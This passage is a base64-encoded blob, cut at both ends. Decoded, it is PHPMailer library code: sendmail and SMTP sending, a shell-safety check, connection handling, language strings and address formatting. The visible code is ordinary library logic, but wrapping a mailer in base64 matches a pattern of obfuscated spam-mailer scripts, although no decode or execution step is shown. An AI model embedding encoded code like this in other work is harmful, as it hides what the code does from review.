w0KICAgICAgICAgICAgICAgIGlmICgkcmVzdWx0ICE9IDApIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoIUAkbWFpbCA9IHBvcGVuKCRzZW5kbWFpbCwgJ3cnKSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmcHV0cygkbWFpbCwgJGhlYWRlcik7DQogICAgICAgICAgICBmcHV0cygkbWFpbCwgJGJvZHkpOw0KICAgICAgICAgICAgJHJlc3VsdCA9IHBjbG9zZSgkbWFpbCk7DQogICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygoJHJlc3VsdCA9PSAwKSwgJHRoaXMtPnRvLCAkdGhpcy0+Y2MsICR0aGlzLT5iY2MsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pOw0KICAgICAgICAgICAgaWYgKCRyZXN1bHQgIT0gMCkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHByb3RlY3RlZCBzdGF0aWMgZnVuY3Rpb24gaXNTaGVsbFNhZmUoJHN0cmluZykgew0KICAgICAgICBpZiAoQGVzY2FwZXNoZWxsY21kKCRzdHJpbmcpICE9PSAkc3RyaW5nIG9yICFpbl9hcnJheShAZXNjYXBlc2hlbGxhcmcoJHN0cmluZyksIGFycmF5KA0KICAgICAgICAgICAgIickc3RyaW5nJyIsDQogICAgICAgICAgICAiXCIkc3RyaW5nXCIiDQogICAgICAgICkpKSB7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgJGxlbmd0aCA9IHN0cmxlbigkc3RyaW5nKTsNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgew0KICAgICAgICAgICAgJGMgPSAkc3RyaW5nWyRpXTsNCiAgICAgICAgICAgIGlmICghY3R5cGVfYWxudW0oJGMpICYmIHN0cnBvcygnQF8tLicsICRjKSA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBtYWlsU2VuZCgkaGVhZGVyLCAkYm9keSkgew0KICAgICAgICAkdG9BcnIgPSBhcnJheSgpOw0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvYWRkcikgew0KICAgICAgICAgICAgJHRvQXJyW10gPSAkdGhpcy0+YWRkckZvcm1hdCgkdG9hZGRyKTsNCiAgICAgICAgfQ0KICAgICAgICAkdG8gICAgID0gaW1wbG9kZSgnLCAnLCAkdG9BcnIpOw0KICAgICAgICAkcGFyYW1zID0gbnVsbDsNCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkdGhpcy0+U2VuZGVyKSkgew0KICAgICAgICAgICAgaWYgKHNlbGY6OmlzU2hlbGxTYWZlKCR0aGlzLT5TZW5kZXIpKSB7DQogICAgICAgICAgICAgICAgJHBhcmFtcyA9IHNwcmludGYoJy1mJXMnLCAkdGhpcy0+U2VuZGVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpIGFuZCAhaW5pX2dldCgnc2FmZV9tb2RlJykgYW5kICR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPlNlbmRlcikpIHsNCiAgICAgICAgICAgICRvbGRfZnJvbSA9IGluaV9nZXQoJ3NlbmRtYWlsX2Zyb20nKTsNCiAgICAgICAgICAgIGluaV9zZXQoJ3NlbmRtYWlsX2Zyb20nLCAkdGhpcy0+U2VuZGVyKTsNCiAgICAgICAgfQ0KICAgICAgICAkcmVzdWx0ID0gZmFsc2U7DQogICAgICAgIGlmICgkdGhpcy0+U2luZ2xlVG8gYW5kIGNvdW50KCR0b0FycikgPiAxKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkdG9BcnIgYXMgJHRvQWRkcikgew0KICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+bWFpbFBhc3N0aHJ1KCR0b0FkZHIsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7DQogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soJHJlc3VsdCwgYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICR0b0FkZHINCiAgICAgICAgICAgICAgICApLCAkdGhpcy0+Y2MsICR0aGlzLT5iY2MsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5tYWlsUGFzc3RocnUoJHRvLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpOw0KICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soJHJlc3VsdCwgJHRoaXMtPnRvLCAkdGhpcy0+Y2MsICR0aGlzLT5iY2MsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pOw0KICAgICAgICB9DQogICAgICAgIGlmIChpc3NldCgkb2xkX2Zyb20pKSB7DQogICAgICAgICAgICBpbmlfc2V0KCdzZW5kbWFpbF9mcm9tJywgJG9sZF9mcm9tKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISRyZXN1bHQpIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2luc3RhbnRpYXRlJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0U01UUEluc3RhbmNlKCkgew0KICAgICAgICBpZiAoIWlzX29iamVjdCgkdGhpcy0+c210cCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwICAgICAgICAgICAgPSBuZXcgU01UUDsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwLT5Vc2VTb2NrcyAgPSAkdGhpcy0+VXNlU29ja3M7DQogICAgICAgICAgICAkdGhpcy0+c210cC0+U29ja3NIb3N0ID0gJHRoaXMtPlNvY2tzSG9zdDsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwLT5Tb2Nrc1BvcnQgPSAkdGhpcy0+U29ja3NQb3J0Ow0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkdGhpcy0+c210cDsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNtdHBTZW5kKCRoZWFkZXIsICRib2R5KSB7DQogICAgICAgICRiYWRfcmNwdCA9IGFycmF5KCk7DQogICAgICAgIGlmICghJHRoaXMtPnNtdHBDb25uZWN0KCR0aGlzLT5TTVRQT3B0aW9ucykpIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3NtdHBfY29ubmVjdF9mYWlsZWQnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkdGhpcy0+U2VuZGVyKSkgew0KICAgICAgICAgICAgJHNtdHBfZnJvbSA9ICR0aGlzLT5TZW5kZXI7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPkZyb207DQogICAgICAgIH0NCiAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+bWFpbCgkc210cF9mcm9tKSkgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCdmcm9tX2ZhaWxlZCcpIC4gJHNtdHBfZnJvbSAuICcgOiAnIC4gaW1wbG9kZSgnLCcsICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpKSk7DQogICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5FcnJvckluZm8sIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKGFycmF5KA0KICAgICAgICAgICAgJHRoaXMtPnRvLA0KICAgICAgICAgICAgJHRoaXMtPmNjLA0KICAgICAgICAgICAgJHRoaXMtPmJjYw0KICAgICAgICApIGFzICR0b2dyb3VwKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkdG9ncm91cCBhcyAkdG8pIHsNCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5yZWNpcGllbnQoJHRvWzBdKSkgew0KICAgICAgICAgICAgICAgICAgICAkZXJyb3IgICAgICA9ICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpOw0KICAgICAgICAgICAgICAgICAgICAkYmFkX3JjcHRbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgJ3RvJyA9PiAkdG9bMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAnZXJyb3InID0+ICRlcnJvclsnZGV0YWlsJ10NCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgJGlzU2VudCAgICAgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkaXNTZW50ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soJGlzU2VudCwgYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICR0b1swXQ0KICAgICAgICAgICAgICAgICksIGFycmF5KCksIGFycmF5KCksICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmICgoY291bnQoJHRoaXMtPmFsbF9yZWNpcGllbnRzKSA+IGNvdW50KCRiYWRfcmNwdCkpIGFuZCAhJHRoaXMtPnNtdHAtPmRhdGEoJGhlYWRlciAuICRib2R5KSkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZGF0YV9ub3RfYWNjZXB0ZWQnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5TTVRQS2VlcEFsaXZlKSB7DQogICAgICAgICAgICAkdGhpcy0+c210cC0+cmVzZXQoKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwLT5xdWl0KCk7DQogICAgICAgICAgICAkdGhpcy0+c210cC0+Y2xvc2UoKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoY291bnQoJGJhZF9yY3B0KSA+IDApIHsNCiAgICAgICAgICAgICRlcnJzdHIgPSAnJzsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRiYWRfcmNwdCBhcyAkYmFkKSB7DQogICAgICAgICAgICAgICAgJGVycnN0ciAuPSAkYmFkWyd0byddIC4gJzogJyAuICRiYWRbJ2Vycm9yJ107DQogICAgICAgICAgICB9DQogICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdyZWNpcGllbnRzX2ZhaWxlZCcpIC4gJGVycnN0ciwgc2VsZjo6U1RPUF9DT05USU5VRSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzbXRwQ29ubmVjdCgkb3B0aW9ucyA9IG51bGwpIHsNCiAgICAgICAgaWYgKGlzX251bGwoJHRoaXMtPnNtdHApKSB7DQogICAgICAgICAgICAkdGhpcy0+c210cCA9ICR0aGlzLT5nZXRTTVRQSW5zdGFuY2UoKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoaXNfbnVsbCgkb3B0aW9ucykpIHsNCiAgICAgICAgICAgICRvcHRpb25zID0gJHRoaXMtPlNNVFBPcHRpb25zOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdGVkKCkpIHsNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5zbXRwLT5zZXRUaW1lb3V0KCR0aGlzLT5UaW1lb3V0KTsNCiAgICAgICAgJHRoaXMtPnNtdHAtPnNldERlYnVnTGV2ZWwoJHRoaXMtPlNNVFBEZWJ1Zyk7DQogICAgICAgICR0aGlzLT5zbXRwLT5zZXREZWJ1Z091dHB1dCgkdGhpcy0+RGVidWdvdXRwdXQpOw0KICAgICAgICAkdGhpcy0+c210cC0+c2V0VmVycCgkdGhpcy0+ZG9fdmVycCk7DQogICAgICAgICRob3N0cyAgICAgICAgID0gZXhwbG9kZSgnOycsICR0aGlzLT5Ib3N0KTsNCiAgICAgICAgJGxhc3RleGNlcHRpb24gPSBudWxsOw0KICAgICAgICBmb3JlYWNoICgkaG9zdHMgYXMgJGhvc3RlbnRyeSkgew0KICAgICAgICAgICAgJGhvc3RpbmZvID0gYXJyYXkoKTsNCiAgICAgICAgICAgIGlmICghcHJlZ19tYXRjaCgnL14oKHNzbHx0bHMpOlwvXC8pKihbYS16QS1aMC05XC4tXSopOj8oWzAtOV0qKSQvJywgdHJpbSgkaG9zdGVudHJ5KSwgJGhvc3RpbmZvKSkgew0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHByZWZpeCA9ICcnOw0KICAgICAgICAgICAgJHNlY3VyZSA9ICR0aGlzLT5TTVRQU2VjdXJlOw0KICAgICAgICAgICAgJHRscyAgICA9ICgkdGhpcy0+U01UUFNlY3VyZSA9PSAndGxzJyk7DQogICAgICAgICAgICBpZiAoJ3NzbCcgPT0gJGhvc3RpbmZvWzJdIG9yICgnJyA9PSAkaG9zdGluZm9bMl0gYW5kICdzc2wnID09ICR0aGlzLT5TTVRQU2VjdXJlKSkgew0KICAgICAgICAgICAgICAgICRwcmVmaXggPSAnc3NsOi8vJzsNCiAgICAgICAgICAgICAgICAkdGxzICAgID0gZmFsc2U7DQogICAgICAgICAgICAgICAgJHNlY3VyZSA9ICdzc2wnOw0KICAgICAgICAgICAgfSBlbHNlaWYgKCRob3N0aW5mb1syXSA9PSAndGxzJykgew0KICAgICAgICAgICAgICAgICR0bHMgICAgPSB0cnVlOw0KICAgICAgICAgICAgICAgICRzZWN1cmUgPSAndGxzJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRzc2xleHQgPSBkZWZpbmVkKCdPUEVOU1NMX0FMR09fU0hBMScpOw0KICAgICAgICAgICAgaWYgKCd0bHMnID09PSAkc2VjdXJlIG9yICdzc2wnID09PSAkc2VjdXJlKSB7DQogICAgICAgICAgICAgICAgaWYgKCEkc3NsZXh0KSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4dGVuc2lvbl9taXNzaW5nJykgLiAnb3BlbnNzbCcsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRob3N0ICA9ICRob3N0aW5mb1szXTsNCiAgICAgICAgICAgICRwb3J0ICA9ICR0aGlzLT5Qb3J0Ow0KICAgICAgICAgICAgJHRwb3J0ID0gKGludGVnZXIpICRob3N0aW5mb1s0XTsNCiAgICAgICAgICAgIGlmICgkdHBvcnQgPiAwIGFuZCAkdHBvcnQgPCA2NTUzNikgew0KICAgICAgICAgICAgICAgICRwb3J0ID0gJHRwb3J0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0KCRwcmVmaXggLiAkaG9zdCwgJHBvcnQsICR0aGlzLT5UaW1lb3V0LCAkb3B0aW9ucykpIHsNCiAgICAgICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPkhlbG8pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRoZWxsbyA9ICR0aGlzLT5IZWxvOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJGhlbGxvID0gJHRoaXMtPnNlcnZlckhvc3RuYW1lKCk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmhlbGxvKCRoZWxsbyk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U01UUEF1dG9UTFMgYW5kICRzc2xleHQgYW5kICRzZWN1cmUgIT0gJ3NzbCcgYW5kICR0aGlzLT5zbXRwLT5nZXRTZXJ2ZXJFeHQoJ1NUQVJUVExTJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICR0bHMgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGxzKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5zdGFydFRMUygpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnY29ubmVjdF9ob3N0JykpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmhlbGxvKCRoZWxsbyk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TTVRQQXV0aCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+YXV0aGVudGljYXRlKCR0aGlzLT5Vc2VybmFtZSwgJHRoaXMtPlBhc3N3b3JkLCAkdGhpcy0+QXV0aFR5cGUsICR0aGlzLT5SZWFsbSwgJHRoaXMtPldvcmtzdGF0aW9uKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2F1dGhlbnRpY2F0ZScpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAgICAgICAgICRsYXN0ZXhjZXB0aW9uID0gJGV4YzsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+c210cC0+Y2xvc2UoKTsNCiAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zIGFuZCAhaXNfbnVsbCgkbGFzdGV4Y2VwdGlvbikpIHsNCiAgICAgICAgICAgIHRocm93ICRsYXN0ZXhjZXB0aW9uOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNtdHBDbG9zZSgpIHsNCiAgICAgICAgaWYgKGlzX2EoJHRoaXMtPnNtdHAsICdTTVRQJykpIHsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdGVkKCkpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRMYW5ndWFnZSgkbGFuZ2NvZGUgPSAnZW4nLCAkbGFuZ19wYXRoID0gJycpIHsNCiAgICAgICAgJHJlbmFtZWRfbGFuZ2NvZGVzID0gYXJyYXkoDQogICAgICAgICAgICAnYnInID0+ICdwdF9icicsDQogICAgICAgICAgICAnY3onID0+ICdjcycsDQogICAgICAgICAgICAnZGsnID0+ICdkYScsDQogICAgICAgICAgICAnbm8nID0+ICduYicsDQogICAgICAgICAgICAnc2UnID0+ICdzdicNCiAgICAgICAgKTsNCiAgICAgICAgaWYgKGlzc2V0KCRyZW5hbWVkX2xhbmdjb2Rlc1skbGFuZ2NvZGVdKSkgew0KICAgICAgICAgICAgJGxhbmdjb2RlID0gJHJlbmFtZWRfbGFuZ2NvZGVzWyRsYW5nY29kZV07DQogICAgICAgIH0NCiAgICAgICAgJFBIUE1BSUxFUl9MQU5HID0gYXJyYXkoDQogICAgICAgICAgICAnYXV0aGVudGljYXRlJyA9PiAnU01UUCBFcnJvcjogQ291bGQgbm90IGF1dGhlbnRpY2F0ZS4nLA0KICAgICAgICAgICAgJ2Nvbm5lY3RfaG9zdCcgPT4gJ1NNVFAgRXJyb3I6IENvdWxkIG5vdCBjb25uZWN0IHRvIFNNVFAgaG9zdC4nLA0KICAgICAgICAgICAgJ2RhdGFfbm90X2FjY2VwdGVkJyA9PiAnU01UUCBFcnJvcjogZGF0YSBub3QgYWNjZXB0ZWQuJywNCiAgICAgICAgICAgICdlbXB0eV9tZXNzYWdlJyA9PiAnTWVzc2FnZSBib2R5IGVtcHR5JywNCiAgICAgICAgICAgICdlbmNvZGluZycgPT4gJ1Vua25vd24gZW5jb2Rpbmc6ICcsDQogICAgICAgICAgICAnZXhlY3V0ZScgPT4gJ0NvdWxkIG5vdCBleGVjdXRlOiAnLA0KICAgICAgICAgICAgJ2ZpbGVfYWNjZXNzJyA9PiAnQ291bGQgbm90IGFjY2VzcyBmaWxlOiAnLA0KICAgICAgICAgICAgJ2ZpbGVfb3BlbicgPT4gJ0ZpbGUgRXJyb3I6IENvdWxkIG5vdCBvcGVuIGZpbGU6ICcsDQogICAgICAgICAgICAnZnJvbV9mYWlsZWQnID0+ICdUaGUgZm9sbG93aW5nIEZyb20gYWRkcmVzcyBmYWlsZWQ6ICcsDQogICAgICAgICAgICAnaW5zdGFudGlhdGUnID0+ICdNQUlMX0RJU0FCTEVEJywNCiAgICAgICAgICAgICdpbnZhbGlkX2FkZHJlc3MnID0+ICdJbnZhbGlkIGFkZHJlc3M6ICcsDQogICAgICAgICAgICAnbWFpbGVyX25vdF9zdXBwb3J0ZWQnID0+ICcgbWFpbGVyIGlzIG5vdCBzdXBwb3J0ZWQuJywNCiAgICAgICAgICAgICdwcm92aWRlX2FkZHJlc3MnID0+ICdZb3UgbXVzdCBwcm92aWRlIGF0IGxlYXN0IG9uZSByZWNpcGllbnQgZW1haWwgYWRkcmVzcy4nLA0KICAgICAgICAgICAgJ3JlY2lwaWVudHNfZmFpbGVkJyA9PiAnU01UUCBFcnJvcjogVGhlIGZvbGxvd2luZyByZWNpcGllbnRzIGZhaWxlZDogJywNCiAgICAgICAgICAgICdzaWduaW5nJyA9PiAnU2lnbmluZyBFcnJvcjogJywNCiAgICAgICAgICAgICdzbXRwX2Nvbm5lY3RfZmFpbGVkJyA9PiAnU01UUCBjb25uZWN0KCkgZmFpbGVkLicsDQogICAgICAgICAgICAnc210cF9lcnJvcicgPT4gJ1NNVFAgc2VydmVyIGVycm9yOiAnLA0KICAgICAgICAgICAgJ3ZhcmlhYmxlX3NldCcgPT4gJ0Nhbm5vdCBzZXQgb3IgcmVzZXQgdmFyaWFibGU6ICcsDQogICAgICAgICAgICAnZXh0ZW5zaW9uX21pc3NpbmcnID0+ICdFeHRlbnNpb24gbWlzc2luZzogJw0KICAgICAgICApOw0KICAgICAgICBpZiAoZW1wdHkoJGxhbmdfcGF0aCkpIHsNCiAgICAgICAgICAgICRsYW5nX3BhdGggPSBkaXJuYW1lKF9fRklMRV9fKSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnbGFuZ3VhZ2UnIC4gRElSRUNUT1JZX1NFUEFSQVRPUjsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy9eW2Etel17Mn0oPzpfW2EtekEtWl17Mn0pPyQvJywgJGxhbmdjb2RlKSkgew0KICAgICAgICAgICAgJGxhbmdjb2RlID0gJ2VuJzsNCiAgICAgICAgfQ0KICAgICAgICAkZm91bmRsYW5nID0gdHJ1ZTsNCiAgICAgICAgJGxhbmdfZmlsZSA9ICRsYW5nX3BhdGggLiAncGhwbWFpbGVyLmxhbmctJyAuICRsYW5nY29kZSAuICcucGhwJzsNCiAgICAgICAgaWYgKCRsYW5nY29kZSAhPSAnZW4nKSB7DQogICAgICAgICAgICBpZiAoIWlzX3JlYWRhYmxlKCRsYW5nX2ZpbGUpKSB7DQogICAgICAgICAgICAgICAgJGZvdW5kbGFuZyA9IGZhbHNlOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkZm91bmRsYW5nID0gaW5jbHVkZSAkbGFuZ19maWxlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5sYW5ndWFnZSA9ICRQSFBNQUlMRVJfTEFORzsNCiAgICAgICAgcmV0dXJuIChib29sZWFuKSAkZm91bmRsYW5nOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VHJhbnNsYXRpb25zKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckFwcGVuZCgkdHlwZSwgJGFkZHIpIHsNCiAgICAgICAgJGFkZHJlc3NlcyA9IGFycmF5KCk7DQogICAgICAgIGZvcmVhY2ggKCRhZGRyIGFzICRhZGRyZXNzKSB7DQogICAgICAgICAgICAkYWRkcmVzc2VzW10gPSAkdGhpcy0+YWRkckZvcm1hdCgkYWRkcmVzcyk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICR0eXBlIC4gJzogJyAuIGltcGxvZGUoJywgJywgJGFkZHJlc3NlcykgLiAkdGhpcy0+TEU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRyRm9ybWF0KCRhZGRyKSB7DQogICAgICAgIGlmIChlbXB0eSgkYWRkclsxXSkpIHsNCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VjdXJlSGVhZGVyKCRhZGRyWzBdKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMV0pLCAncGhyYXNlJykgLiAnIDwnIC4gJHRoaXMtPnNlY3VyZUhlYWRlcigkYWRkclswXSkgLiAnPic7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHdyYXBUZXh0KCRtZXNzYWdlLCAkbGVuZ3RoLCAkcXBfbW9kZSA9IGZhbHNlKSB7DQogICAgICAgIGlmICgkcXBfbW9kZSkgew0KICAgICAgICAgICAgJHNvZnRfYnJlYWsgPSBzcHJpbnRmKCcgPSVzJywgJHRoaXMtPkxFKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRzb2Z0X2JyZWFrID0gJHRoaXMtPkxFOw0KICAgICAgICB9DQogICAgICAgICRpc191dGY4ID0gKHN0cnRvbG93ZXIoJHRoaXMtPkNoYXJTZXQpID09ICd1dGYtOCcpOw0KICAgICAgICAkbGVsZW4gICA9IHN0cmxlbigkdGhpcy0+TEUpOw0KICAgICAgICAkY3JsZmxlbiA9IHN0cmxlbihzZWxmOjpDUkxGKTsNCiAgICAgICAgJG1lc3NhZ2UgPSAkdGhpcy0+Zml4RU9MKCRtZXNzYWdlKTsNCiAgICAgICAgaWYgKHN1YnN0cigkbWVzc2FnZSwgLSRsZWxlbikgPT0gJHRoaXMtPkxFKSB7DQogICAgICAgICAgICAkbWVzc2FnZSA9IHN1YnN0cigkbWVzc2F